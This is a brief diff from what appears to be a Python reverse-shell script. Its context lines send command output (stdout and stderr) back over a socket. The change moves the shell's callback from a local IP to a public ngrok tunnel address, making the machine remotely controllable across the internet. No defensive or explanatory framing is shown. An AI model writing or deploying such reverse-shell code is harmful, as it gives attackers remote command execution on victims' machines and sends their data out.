@@ -15,4 +15,4 @@ def con_client(rhost,rport):
         null_resp = resp.stderr.read()
         get.send(response + null_resp)
 
-con_client('192.168.1.104',1337)
+con_client('0.tcp.in.ngrok.io',12072)
